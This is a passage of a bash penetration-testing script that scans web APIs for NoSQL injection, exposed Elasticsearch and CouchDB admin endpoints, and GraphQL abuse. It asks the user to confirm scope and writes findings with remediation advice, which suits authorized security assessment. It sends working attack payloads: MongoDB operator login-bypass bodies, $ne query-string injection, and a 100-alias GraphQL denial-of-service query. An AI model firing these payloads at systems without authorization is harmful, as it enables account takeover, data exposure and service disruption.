#!/bin/bash
# L1 ORC-NAV — read MRK:NAV_TOC first; fetch MRK ranges precisely (no default line count)
# L2 NAV:v1 → ./LOCAL-INDEX.md

# MRK:15_NAV_TOC — Section index | nav,toc,index | L5-57
# - MRK:15_ROOT    — ROOT CHECK                    | root,check,euid                    | L58-67   | ⚠ no-insert-before
# - MRK:15_CONF    — ENGAGEMENT CONFIGURATION      | conf,engagement,configuration      | L68-145  | ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:15_LOG     — COLOURS AND LOGGING           | log,colours,logging                | L146-168 | ⚠ no-insert-before
# - MRK:15_ARGS    — ARGUMENT PARSING              | args,argument,parsing              | L169-220 | ⚠ no-insert-before
# - MRK:15_DB      — MSF DB HELPERS                | db,msf,helpers,web,ports           | L221-275 | ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:15_CONFIRM — SCOPE CONFIRMATION            | confirm,scope,confirmation         | L276-290 | ⚠ no-insert-before; propose-before-edit
# - MRK:15_TARGETS — TARGET ASSEMBLY               | targets,target,assembly            | L291-325 | ⚠ no-insert-before; read-toc-first
# - MRK:15_FIND    — FINDING WRITER                | find,finding,writer,jsonl,jq       | L326-350 | ⚠ no-insert-before; read-toc-first
# - MRK:15_UTILS   — SHARED UTILITIES              | utils,shared,utilities,curl,proxy  | L351-420 | ⚠ no-insert-before
# - MRK:15_PROF    — PROFILE SETUP                 | prof,profile,setup,quick,deep      | L421-465 | ⚠ no-insert-before
# - MRK:15_T01     — T01 NOSQL INJECTION           | t01,nosql,mongodb,elasticsearch    | L466-570 | ⚠ read-toc-first
# - MRK:15_T02     — T02 GRAPHQL ADVANCED          | t02,graphql,alias,depth,suggestion | L571-690 | ⚠ read-toc-first
# - MRK:15_T03     — T03 WEBSOCKET ATTACKS         | t03,websocket,cswsh,origin,ws      | L691-790 | ⚠ read-toc-first
# - MRK:15_T04     — T04 BUSINESS LOGIC DEEP       | t04,business,logic,price,race      | L791-910 | ⚠ read-toc-first; deep-only
# - MRK:15_T05     — T05 HTTP PARAMETER POLLUTION  | t05,hpp,duplicate,array,collision  | L911-995 | ⚠ read-toc-first
# - MRK:15_T06     — T06 API KEY SECURITY          | t06,apikey,entropy,url,scope       | L996-1080| ⚠ read-toc-first
# - MRK:15_T07     — T07 CONTENT-TYPE CONFUSION    | t07,ctype,xml,form,mime,waf        | L1081-1155|⚠ read-toc-first
# - MRK:15_T08     — T08 PROTOTYPE POLLUTION       | t08,proto,__proto__,constructor    | L1156-1240|⚠ read-toc-first
# - MRK:15_T09     — T09 SCHEMA DRIFT & SHADOW API | t09,schema,shadow,zombie,grpc      | L1241-1370|⚠ read-toc-first
# - MRK:15_T10     — T10 MASS OBJECT ENUMERATION   | t10,idor,enum,sequential,uuid      | L1371-1470|⚠ read-toc-first; deep-only
# - MRK:15_TRUN    — PER-TARGET DISPATCHER         | trun,target,dispatcher,test        | L1471-1530|⚠ no-insert-before; read-toc-first
# - MRK:15_MAIN    — MAIN ENTRY POINT              | main,entry,point,summary           | L1531-1680|⚠ no-insert-before; read-toc-first
# NAV-LEN: 24 entries | Integrity-hash: NEEDS-REINDEX | Last-indexed: 2026-06-27

# =============================================================================
# 15_api_deep.sh — TechGuard. [VAPT-Advanced v1.0 — 2026-06-27]
# Deep API Security — Advanced attack patterns beyond OWASP API Top 10 baseline
# Coverage: NoSQL injection (MongoDB/Elasticsearch/CouchDB), GraphQL alias DoS +
#   depth/complexity bypass + field suggestion, WebSocket CSWSH + auth bypass,
#   business logic deep (price/qty manipulation, race conditions), HTTP parameter
#   pollution, API key security (entropy + URL exposure + scope), content-type
#   confusion (WAF bypass via encoding switch), prototype pollution (__proto__ +
#   constructor.prototype), schema drift + shadow/zombie API discovery, mass
#   object enumeration (sequential/UUID IDOR chains)
# Profiles: quick | standard (default) | deep
# Consumes: MSF DB web hosts or --host/--targets; API_DEEP_* vars in pt-orc.conf
# Produces: per-host evidence files + JSONL findings + markdown summary
# =============================================================================
# USAGE:
#   ./15_api_deep.sh [OPTIONS]
#
# OPTIONS:
#   --targets <file>              File with host:port entries (one per line)
#   --host <IP:PORT>              Single target (repeatable)
#   --from-db                     Pull web hosts from MSF DB (default if no targets)
#   --tier <ghost|normal|loud>    Controls delays between requests
#   --token <bearer>              Bearer token for authenticated probes
#   --cookie <name=value>         Session cookie for authenticated probes
#   --api-key <key>               API key to test for entropy + scope issues
#   --profile <name>              quick|standard|deep (default: standard)
#   --api-base <path>             Base API path prefix (default: /api)
#   --api-version <v>             API version string (default: v1)
#   --graphql-url <path>          GraphQL endpoint path hint
#   --nosql-param <name>          Parameter name to fuzz for NoSQL injection (repeatable)
#   --business-endpoint <path>    Business logic endpoint to probe (e.g. /api/order)
#   --enum-start <n>              Start ID for object enumeration (default: 1)
#   --enum-count <n>              Number of IDs to walk (default: 10)
#   --intercept-proxy <url>       Proxy all curl requests through Burp/ZAP
#   --skip-test <N>               Skip test N (repeatable)
#   --only-test <N>               Run only test N (repeatable)
#   --yes                         Skip interactive scope confirmation
#   --dry-run                     Print commands without executing
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# =============================================================================
# MRK:15_ROOT — ROOT CHECK | root,check,euid | L58-67
# NAV-RULE: no-insert-before
# =============================================================================
if [[ "$EUID" -ne 0 ]] && [[ "${PTORC_ALLOW_NON_ROOT:-0}" != "1" ]]; then
    echo "[ERROR] This script must be run as root."
    echo "        Run: sudo $0 $*"
    exit 1
fi

# =============================================================================
# MRK:15_CONF — ENGAGEMENT CONFIGURATION | conf,engagement,configuration | L68-145
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

[[ -f "${SCRIPT_DIR}/pt-orc.conf" ]] && source "${SCRIPT_DIR}/pt-orc.conf" \
    || echo "[WARN] pt-orc.conf not found in ${SCRIPT_DIR}"

[[ -f "${SCRIPT_DIR}/orc-common-lib.sh" ]] && source "${SCRIPT_DIR}/orc-common-lib.sh" \
    || echo "[WARN] orc-common-lib.sh not found — trail/notes writes disabled"

PROJ_SLUG="${PROJECT_NAME//[^A-Za-z0-9._-]/_}"
EVIDENCE_BASE="${SCAN_EVIDENCE_DIR:-${SCRIPT_DIR}/evidence}/${PROJ_SLUG}"

CURL_TIMEOUT="${CURL_TIMEOUT:-10}"
CURL_CONNECT=5

CURL_PROXY_ARGS=()

PROFILE="standard"
SKIP_TESTS=()
ONLY_TESTS=()

_T_ENABLED=()
for _i in $(seq 1 10); do _T_ENABLED[$_i]=1; done

TIER="${GLOBAL_TIER:-normal}"
FROM_DB=1
AUTO_YES=0
DRY_RUN=0

BEARER_TOKEN=""
COOKIE_HEADER=""
API_KEY="${API_KEY:-}"

# API configuration — inherit from conf; CLI overrides below
API_BASE="${API_BASE:-/api}"
API_VERSION="${API_VERSION:-v1}"
GRAPHQL_URL="${GRAPHQL_URL:-/graphql}"

# Deep API-specific configuration
NOSQL_PARAMS=()
BUSINESS_EP="${API_DEEP_BUSINESS_EP:-}"
ENUM_START="${API_DEEP_ENUM_START:-1}"
ENUM_COUNT="${API_DEEP_ENUM_COUNT:-10}"

# Populate default NoSQL params from conf or fallback
if [[ -n "${API_DEEP_NOSQL_PARAMS:-}" ]]; then
    read -ra NOSQL_PARAMS <<< "$API_DEEP_NOSQL_PARAMS"
else
    NOSQL_PARAMS=("username" "password" "email" "id" "search" "query" "filter")
fi

EXTRA_HOSTS=()
TARGETS_FILE=""

# Cross-test state (reset per target in test_target)
_GQL_ENDPOINT=""
_WS_ENDPOINT=""
_SHADOW_FOUND=0

tier_delay() { case "$1" in ghost) echo 2;; evasion) echo 3;; normal) echo 0;; loud) echo 0;; *) echo 0;; esac; }

TLS_PORTS="443 8443 4443 9443 10443"

# =============================================================================
# MRK:15_LOG — COLOURS AND LOGGING | log,colours,logging | L146-168
# NAV-RULE: no-insert-before
# =============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; NC='\033[0m'

_ts()  { date +'%Y%m%d_%H%M%S'; }
_now() { date +'%Y-%m-%d %H:%M:%S'; }

SESSION_TS="$(_ts)"
EV_TS="$(_ev_ts)"
[[ "$EVIDENCE_BASE" != /* ]] && EVIDENCE_BASE="$(pwd)/${EVIDENCE_BASE}"
mkdir -p "${EVIDENCE_BASE}/_sweep" "${SCRIPT_DIR}/working"
LOG_FILE="${EVIDENCE_BASE}/_sweep/api_deep_${SESSION_TS}.log"
FINDINGS_FILE="${SCRIPT_DIR}/working/$(ev_fname "24-apideep-findings" "jsonl")"
: > "$FINDINGS_FILE"

log()     { local m="[$(_now)] $1";   echo -e "${BLUE}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_ok()  { local m="[$(_now)] ✓ $1"; echo -e "${GREEN}${m}${NC}" >&2;   echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_warn(){ local m="[$(_now)] ⚠ $1"; echo -e "${YELLOW}${m}${NC}" >&2;  echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_err() { local m="[$(_now)] ✗ $1"; echo -e "${RED}${m}${NC}" >&2;     echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_info(){ local m="[$(_now)]   $1"; echo -e "${CYAN}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_hi()  { local m="[$(_now)] ! $1"; echo -e "${MAGENTA}${m}${NC}" >&2; echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }

# =============================================================================
# MRK:15_ARGS — ARGUMENT PARSING | args,argument,parsing | L169-220
# NAV-RULE: no-insert-before
# =============================================================================

while [[ $# -gt 0 ]]; do
    case "$1" in
        --targets)            TARGETS_FILE="$2";                  FROM_DB=0; shift 2 ;;
        --host)               EXTRA_HOSTS+=("$2");                FROM_DB=0; shift 2 ;;
        --from-db)            FROM_DB=1;                                     shift   ;;
        --tier)               TIER="$2";                                     shift 2 ;;
        --token)              BEARER_TOKEN="$2";                             shift 2 ;;
        --cookie)             COOKIE_HEADER="$2";                            shift 2 ;;
        --api-key)            API_KEY="$2";                                  shift 2 ;;
        --profile)            PROFILE="$2";                                  shift 2 ;;
        --api-base)           API_BASE="$2";                                 shift 2 ;;
        --api-version)        API_VERSION="$2";                              shift 2 ;;
        --graphql-url)        GRAPHQL_URL="$2";                              shift 2 ;;
        --nosql-param)        NOSQL_PARAMS+=("$2");                          shift 2 ;;
        --business-endpoint)  BUSINESS_EP="$2";                              shift 2 ;;
        --enum-start)         ENUM_START="$2";                               shift 2 ;;
        --enum-count)         ENUM_COUNT="$2";                               shift 2 ;;
        --skip-test)          SKIP_TESTS+=("$2");                            shift 2 ;;
        --only-test)          ONLY_TESTS+=("$2");                            shift 2 ;;
        --intercept-proxy)    CURL_PROXY_ARGS=("-x" "$2");                   shift 2 ;;
        --yes)                AUTO_YES=1;                                     shift   ;;
        --dry-run)            DRY_RUN=1;                                     shift   ;;
        *) log_err "Unknown argument: $1"; exit 1 ;;
    esac
done

# =============================================================================
# MRK:15_DB — MSF DB HELPERS | db,msf,helpers,web,ports | L221-275
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

MSF_DB_CONF="/usr/share/metasploit-framework/config/database.yml"
MSF_DB_USER="msf"; MSF_DB_NAME="msf"; MSF_DB_HOST="127.0.0.1"; MSF_DB_PORT="5432"
MSF_DB_PASS="${MSF_DB_PASS:-}"

parse_db_conf() {
    [[ -f "$MSF_DB_CONF" ]] || return
    MSF_DB_USER=$(grep -m1 'username:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_NAME=$(grep -m1 'database:'  "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_PORT=$(grep -m1 'port:'      "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "5432")
    MSF_DB_HOST="127.0.0.1"
    if [[ -z "${MSF_DB_PASS}" ]]; then
        MSF_DB_PASS=$(grep -m1 'password:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" 2>/dev/null || true)
    fi
    export MSF_DB_PASS
}

db_query() {
    PGPASSWORD="${MSF_DB_PASS:-}" psql -h "$MSF_DB_HOST" -p "$MSF_DB_PORT" \
        -U "$MSF_DB_USER" -d "$MSF_DB_NAME" -t -A -c "$1" 2>/dev/null || true
}

get_web_hosts_from_db() {
    local wid; wid=$(db_query \
        "SELECT id FROM workspaces WHERE name='${PROJECT_NAME}' LIMIT 1;")
    if [[ -z "$wid" ]]; then
        log_warn "get_web_hosts_from_db: workspace '${PROJECT_NAME}' not found — trying CSV fallback"
        _get_web_hosts_csv; return
    fi
    local web_ports="80,443,8080,8443,4443,8888,9443,9200,10443,8006"
    local result
    result=$(db_query "SELECT host(h.address) || ':' || s.port \
              FROM services s JOIN hosts h ON s.host_id = h.id \
              WHERE h.workspace_id=${wid} \
              AND s.proto='tcp' AND s.state='open' \
              AND s.port IN (${web_ports}) \
              ORDER BY host(h.address), s.port;")
    if [[ -n "$result" ]]; then
        echo "$result"
    else
        log_warn "get_web_hosts_from_db: no web ports found — trying CSV fallback"
        _get_web_hosts_csv
    fi
}

_get_web_hosts_csv() {
    local csv
    csv=$(find "${EVIDENCE_BASE}/_exports" -name 'services_tcp_*.csv' 2>/dev/null | sort | tail -1)
    [[ -z "$csv" ]] && return
    awk -F',' 'NR>1 && ($3=="80"||$3=="443"||$3=="8080"||$3=="8443"||$3=="4443") {print $1":"$3}' "$csv" 2>/dev/null || true
}

# =============================================================================
# MRK:15_CONFIRM — SCOPE CONFIRMATION | confirm,scope,confirmation | L276-290
# NAV-RULE: no-insert-before; propose-before-edit
# =============================================================================

confirm_scope() {
    local hosts=("$@")
    log_warn "=== SCOPE CONFIRMATION — API Deep Review v1.0 ==="
    log_warn "Profile: ${PROFILE} | Tier: ${TIER} | Tests: T01-T10"
    log_warn "Targets (${#hosts[@]}):"
    for h in "${hosts[@]}"; do log_warn "  → $h"; done
    [[ "${AUTO_YES:-0}" -eq 1 ]] && { log_ok "Auto-confirmed (--yes)"; return 0; }
    echo -en "${YELLOW}Proceed with Deep API review against these targets? [y/N]: ${NC}" >&2
    read -r ans
    [[ "$ans" =~ ^[Yy]$ ]] || { log_err "Aborted by user."; exit 0; }
}

# =============================================================================
# MRK:15_TARGETS — TARGET ASSEMBLY | targets,target,assembly | L291-325
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

assemble_targets() {
    local -a all=()
    if [[ -n "$TARGETS_FILE" && -f "$TARGETS_FILE" ]]; then
        while IFS= read -r line; do
            line="${line%%#*}"; line="${line// /}"
            [[ -n "$line" ]] && all+=("$line")
        done < "$TARGETS_FILE"
    fi
    for h in "${EXTRA_HOSTS[@]+"${EXTRA_HOSTS[@]}"}"; do
        all+=("$h")
    done
    if [[ "${FROM_DB:-0}" -eq 1 && "${#all[@]}" -eq 0 ]]; then
        parse_db_conf
        local db_hosts
        db_hosts=$(get_web_hosts_from_db)
        if [[ -n "$db_hosts" ]]; then
            while IFS= read -r line; do
                [[ -n "$line" ]] && all+=("$line")
            done <<< "$db_hosts"
        fi
    fi
    if [[ "${#all[@]}" -eq 0 ]]; then
        log_err "No targets found. Use --host, --targets, or --from-db with an active MSF workspace."
        exit 1
    fi
    printf '%s\n' "${all[@]}"
}

# =============================================================================
# MRK:15_FIND — FINDING WRITER | find,finding,writer,jsonl,jq | L326-350
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

_FIND_CTR=0

emit_finding() {
    local sev="$1" title="$2" desc="$3" rec="$4" ev_tag="$5"
    (( _FIND_CTR++ )) || true
    local ip_slug="${_CURRENT_IP//./_}"
    local fid="f-24-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local ev_id="ev-24-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local payload
    payload=$(printf '{"id":"%s","title":"%s","severity":"%s","phase":"15_api_deep","evidence_ids":["%s"],"description":"%s","recommendation":"%s","retest_status":"n/a","residual_risk":""}' \
        "$fid" \
        "$(echo "$title" | sed 's/"/\\"/g')" \
        "$sev" \
        "${ev_tag:-$ev_id}" \
        "$(echo "$desc"  | sed 's/"/\\"/g')" \
        "$(echo "$rec"   | sed 's/"/\\"/g')")
    echo "$payload" >> "$FINDINGS_FILE"
    log_hi "FINDING [${sev^^}]: ${title}"
}

# =============================================================================
# MRK:15_UTILS — SHARED UTILITIES | utils,shared,utilities,curl,proxy | L351-420
# NAV-RULE: no-insert-before
# =============================================================================

_curl() {
    if [[ "${DRY_RUN:-0}" -eq 1 ]]; then
        log_info "  [DRY-RUN] curl -sk --max-time ${CURL_TIMEOUT} ${CURL_PROXY_ARGS[*]+"${CURL_PROXY_ARGS[*]}"} $*"
        return 0
    fi
    curl -sk --max-time "$CURL_TIMEOUT" --connect-timeout "$CURL_CONNECT" \
        "${CURL_PROXY_ARGS[@]+"${CURL_PROXY_ARGS[@]}"}" "$@" 2>/dev/null || true
}

# Short-timeout variant for WebSocket upgrade probes (avoids 10s hang per path)
_curl_ws() {
    if [[ "${DRY_RUN:-0}" -eq 1 ]]; then
        log_info "  [DRY-RUN] curl -sk --max-time 4 $*"
        return 0
    fi
    curl -sk --max-time 4 --connect-timeout 3 \
        "${CURL_PROXY_ARGS[@]+"${CURL_PROXY_ARGS[@]}"}" "$@" 2>/dev/null || true
}

_curl_head() { _curl -I "$@"; }

_auth_args() {
    local -a args=()
    [[ -n "${BEARER_TOKEN:-}" ]] && args+=(-H "Authorization: Bearer ${BEARER_TOKEN}")
    [[ -n "${COOKIE_HEADER:-}" ]] && args+=(-H "Cookie: ${COOKIE_HEADER}")
    [[ -n "${API_KEY:-}"       ]] && args+=(-H "X-API-Key: ${API_KEY}")
    printf '%s\n' "${args[@]+"${args[@]}"}"
}

_scheme() {
    local port="$1"
    if echo "$TLS_PORTS" | grep -qw "$port"; then echo "https"; else echo "http"; fi
}

_save_ev() {
    local evfile="$1"; shift
    echo "$@" >> "$evfile" 2>/dev/null || true
}

_tier_sleep() {
    local d; d=$(tier_delay "$TIER")
    [[ "$d" -gt 0 ]] && sleep "$d"
}

_test_skip() {
    local n="$1"
    if [[ "${#ONLY_TESTS[@]}" -gt 0 ]]; then
        local found=0
        for o in "${ONLY_TESTS[@]}"; do [[ "$o" == "$n" ]] && found=1; done
        [[ "$found" -eq 0 ]] && return 0
    fi
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do
        [[ "$s" == "$n" ]] && return 0
    done
    local enabled="${_T_ENABLED[$n]:-1}"
    [[ "$enabled" -eq 0 ]] && return 0
    return 1
}

# =============================================================================
# MRK:15_PROF — PROFILE SETUP | prof,profile,setup,quick,deep | L421-465
# NAV-RULE: no-insert-before
# =============================================================================

setup_profile() {
    log_info "Profile: ${PROFILE}"
    case "$PROFILE" in
        quick)
            # T01 T05 T06 T07 only — fast header/parameter checks
            for i in 2 3 4 8 9 10; do _T_ENABLED[$i]=0; done
            ;;
        standard)
            # Skip deep-invasive tests: T04 (sends orders), T10 (walks IDs)
            _T_ENABLED[4]=0
            _T_ENABLED[10]=0
            ;;
        deep)
            # All 10 tests enabled
            ;;
        *)
            log_warn "Unknown profile '${PROFILE}' — using standard"
            _T_ENABLED[4]=0
            _T_ENABLED[10]=0
            ;;
    esac
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do _T_ENABLED[$s]=0; done
}

# =============================================================================
# MRK:15_T01 — T01 NOSQL INJECTION | t01,nosql,mongodb,elasticsearch | L466-570
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t01_nosql() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t01-nosql" "txt")"
    log "T01: NoSQL Injection — ${base_url}"
    _SUMMARY_NOSQL=0

    # Common login endpoints to probe
    local login_paths=(
        "${API_BASE}/login"          "${API_BASE}/auth/login"
        "${API_BASE}/users/login"    "${API_BASE}/authenticate"
        "${API_BASE}/auth"           "${API_BASE}/signin"
        "${API_BASE}/${API_VERSION}/login"
        "/login"                     "/auth/login"
        "/api/auth/login"
    )

    local login_ep=""
    for path in "${login_paths[@]}"; do
        local probe_code
        probe_code=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"username":"probe_nosql_check","password":"probe_nosql_check"}' \
            -o /dev/null -w "%{http_code}" "${base_url}${path}" || true)
        echo "[T01] Login probe ${path}: HTTP ${probe_code}" >> "$evfile"
        if [[ "$probe_code" =~ ^(200|201|400|401|403|422)$ ]]; then
            login_ep="${base_url}${path}"
            log_info "T01: Login endpoint found: ${login_ep} (HTTP ${probe_code})"
            break
        fi
    done

    # MongoDB operator auth bypass
    if [[ -n "$login_ep" ]]; then
        local nosql_resp nosql_code
        nosql_resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
            -w "\n%{http_code}" "${login_ep}" || true)
        nosql_code=$(echo "$nosql_resp" | tail -1)
        local nosql_body; nosql_body=$(echo "$nosql_resp" | head -n -1)
        echo "[T01] MongoDB operator injection (login): HTTP ${nosql_code}" >> "$evfile"
        echo "[T01] Body: ${nosql_body:0:500}" >> "$evfile"

        if [[ "$nosql_code" == "200" ]] && \
           echo "$nosql_body" | grep -qi '"token"\|"access_token"\|"jwt"\|"session"'; then
            _SUMMARY_NOSQL=1
            emit_finding "critical" \
                "NoSQL Auth Bypass — MongoDB Operator Injection (${ip}:${port})" \
                "Login endpoint ${login_ep} returned HTTP 200 with a session token when sent MongoDB operator payload {\"username\":{\"\$gt\":\"\"},\"password\":{\"\$gt\":\"\"}}. The server passes user-controlled JSON directly to MongoDB findOne(), allowing authentication bypass without valid credentials." \
                "Sanitize all input before passing to database queries. Use a schema validation library (e.g., Joi, Zod) that rejects objects where string fields are expected. Never pass raw request body fields to MongoDB query operators." \
                "ev-24-${ip//./_}-t01-nosql-bypass"
        elif [[ "$nosql_code" =~ ^(400|500|503)$ ]] && \
             echo "$nosql_body" | grep -qi 'error\|exception\|cast\|query\|mongo\|operator'; then
            _SUMMARY_NOSQL=1
            emit_finding "medium" \
                "NoSQL Injection Surface — MongoDB Operator Reaches Query Layer (${ip}:${port})" \
                "Login endpoint ${login_ep} returned HTTP ${nosql_code} with a database-level error when sent MongoDB operator payload. The operator was not rejected at the application layer — it reached the database before failing. This confirms an injection surface even without a successful bypass." \
                "Validate and sanitize request body fields. Reject requests where expected string fields contain objects or MongoDB operators (\$gt, \$ne, \$where, etc.)." \
                "ev-24-${ip//./_}-t01-nosql-surface"
        fi
        _tier_sleep
    fi

    # Query string operator injection (?param[$ne]=probe)
    local qs_targets=("${base_url}${API_BASE}/users" "${base_url}${API_BASE}/items" "${base_url}${API_BASE}/data")
    for qs_ep in "${qs_targets[@]}"; do
        local param="${NOSQL_PARAMS[0]:-username}"
        local baseline_code; baseline_code=$(_curl -o /dev/null -w "%{http_code}" "${qs_ep}?${param}=probe_nosql_invalid_user_xyz" || true)
        local inject_code;   inject_code=$(_curl  -o /dev/null -w "%{http_code}" "${qs_ep}?${param}[\$ne]=probe_nosql_invalid_user_xyz" || true)
        local inject_resp;   inject_resp=$(_curl "${qs_ep}?${param}[\$ne]=probe_nosql_invalid_user_xyz" || true)
        echo "[T01] QS injection ${qs_ep}: baseline=${baseline_code} injected=${inject_code}" >> "$evfile"

        if [[ "$inject_code" == "200" && "$baseline_code" != "200" ]]; then
            _SUMMARY_NOSQL=1
            emit_finding "high" \
                "NoSQL Query String Injection — MongoDB Operator in URL Parameter (${ip}:${port})" \
                "Endpoint ${qs_ep} returned HTTP 200 when queried with ${param}[\$ne]=... (MongoDB not-equal operator in query string) while the same request with a literal value returned ${baseline_code}. This indicates the URL parameter is passed unsanitized to a MongoDB query." \
                "Reject query parameters that contain object-style operators ([\$ne], [\$gt], [\$regex], etc.). Parse query strings with a library that does not allow nested objects in scalar fields." \
                "ev-24-${ip//./_}-t01-nosql-qs"
            break
        fi
        _tier_sleep
    done

    # Elasticsearch open index check
    local es_paths=("/_search" "/_cat/indices" "/_all/_search")
    for ep in "${es_paths[@]}"; do
        local es_code; es_code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${ep}" || true)
        echo "[T01] Elasticsearch probe ${ep}: HTTP ${es_code}" >> "$evfile"
        if [[ "$es_code" == "200" ]]; then
            local es_body; es_body=$(_curl "${base_url}${ep}" || true)
            if echo "$es_body" | grep -qi '"hits"\|"indices"\|"shards"\|"_index"'; then
                _SUMMARY_NOSQL=1
                emit_finding "high" \
                    "Elasticsearch API Exposed Without Authentication (${ip}:${port})" \
                    "Elasticsearch endpoint ${base_url}${ep} returned data without authentication. This exposes full document search, index enumeration, and potentially sensitive stored data to unauthenticated attackers." \
                    "Bind Elasticsearch to localhost only or restrict access with a reverse proxy requiring authentication. Enable X-Pack security with TLS and role-based access control. Never expose Elasticsearch directly on public interfaces." \
                    "ev-24-${ip//./_}-t01-elasticsearch"
                break
            fi
        fi
    done

    # CouchDB open access
    local couch_paths=("/_all_dbs" "/_config" "/_session")
    for ep in "${couch_paths[@]}"; do
        local couch_code; couch_code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${ep}" || true)
        echo "[T01] CouchDB probe ${ep}: HTTP ${couch_code}" >> "$evfile"
        if [[ "$couch_code" == "200" ]]; then
            local couch_body; couch_body=$(_curl "${base_url}${ep}" || true)
            if echo "$couch_body" | grep -qi '"couchdb"\|"version"\|\[.*_users\|"userCtx"'; then
                _SUMMARY_NOSQL=1
                emit_finding "high" \
                    "CouchDB Admin Interface Exposed Without Authentication (${ip}:${port})" \
                    "CouchDB endpoint ${base_url}${ep} responded with database information without requiring credentials. Unauthenticated access to CouchDB admin endpoints can allow full database read/write and configuration changes." \
                    "Enable CouchDB admin authentication. Set the admin credentials in /etc/couchdb/local.ini. Restrict _config and _all_dbs endpoints to loopback or trusted network segments only." \
                    "ev-24-${ip//./_}-t01-couchdb"
                break
            fi
        fi
    done

    [[ "${_SUMMARY_NOSQL}" -eq 0 ]] && log_ok "T01: No NoSQL injection confirmed in automated probes"
}

# =============================================================================
# MRK:15_T02 — T02 GRAPHQL ADVANCED | t02,graphql,alias,depth,suggestion | L571-690
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t02_gql_adv() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t02-gql" "txt")"
    log "T02: GraphQL Advanced Attacks — ${base_url}"
    _SUMMARY_GQL=0

    # Discover GraphQL endpoint (set cross-test state)
    local gql_candidates=("${base_url}${GRAPHQL_URL}" "${base_url}/graphql"
                           "${base_url}/api/graphql"   "${base_url}/graphiql"
                           "${base_url}/playground"    "${base_url}/gql"
                           "${base_url}${API_BASE}/graphql")
    _GQL_ENDPOINT=""
    for ep in "${gql_candidates[@]}"; do
        local code; code=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"query":"{__typename}"}' -o /dev/null -w "%{http_code}" "$ep" || true)
        echo "[T02] GraphQL discovery ${ep}: HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201|400)$ ]]; then
            local body; body=$(_curl -X POST -H "Content-Type: application/json" \
                -d '{"query":"{__typename}"}' "$ep" || true)
            if echo "$body" | grep -qi '"data"\|"__typename"\|"errors"'; then
                _GQL_ENDPOINT="$ep"
                log_info "T02: GraphQL endpoint confirmed: ${_GQL_ENDPOINT}"
                echo "[T02] Confirmed endpoint: ${_GQL_ENDPOINT}" >> "$evfile"
                break
            fi
        fi
    done

    if [[ -z "$_GQL_ENDPOINT" ]]; then
        log_ok "T02: No GraphQL endpoint found — skipping advanced GQL tests"
        return
    fi
    _SUMMARY_GQL=1
    _tier_sleep

    # Attack 1: Alias expansion DoS (100 aliases in a single document query — different from
    # step 09's array batch attack which sends multiple JSON documents)
    local aliases=""
    for i in $(seq 1 100); do aliases+="q${i}:__typename "; done
    local alias_resp alias_code
    alias_resp=$(_curl -X POST -H "Content-Type: application/json" \
        -d "{\"query\":\"{${aliases}}\"}" \
        -w "\n%{http_code}" "${_GQL_ENDPOINT}" || true)
    alias_code=$(echo "$alias_resp" | tail -1)
    local alias_body; alias_body=$(echo "$alias_resp" | head -n -1)
    echo "[T02] Alias expansion (100): HTTP ${alias_code} body_len=${#alias_body}" >> "$evfile"

    if [[ "$alias_code" == "200" ]] && echo "$alias_body" | grep -q '"q100"'; then
        emit_finding "high" \
            "GraphQL Alias Expansion DoS — No Query Complexity Limit (${ip}:${port})" \
            "GraphQL endpoint ${_GQL_ENDPOINT} processed a single document query containing 100 field aliases (q1..q100:__typename) and returned all results. This is distinct from array batching — the server's query complexity analyser is absent or misconfigured, allowing an attacker to fan out field resolution cost exponentially within one request." \
            "Implement query complexity analysis (max-complexity threshold). Use libraries such as graphql-query-complexity (Node), Graphene-Django's max_complexity, or Strawberry's extensions. Reject queries exceeding a defined complexity budget." \
            "ev-24-${ip//./_}-t02-alias-dos"
    fi
    _tier_sleep

    # Attack 2: Deep nested query (8 levels) to bypass depth limits
    local deep_q='{"query":"{user{orders{items{product{category{tags{synonyms{name}}}}}}}}"}'
    local depth_resp depth_code
    depth_resp=$(_curl -X POST -H "Content-Type: application/json" \
        -d "$deep_q" -w "\n%{http_code}" "${_GQL_ENDPOINT}" || true)
    depth_code=$(echo "$depth_resp" | tail -1)
    local depth_body; depth_body=$(echo "$depth_resp" | head -n -1)
    echo "[T02] Deep nested query (8 levels): HTTP ${depth_code}" >> "$evfile"
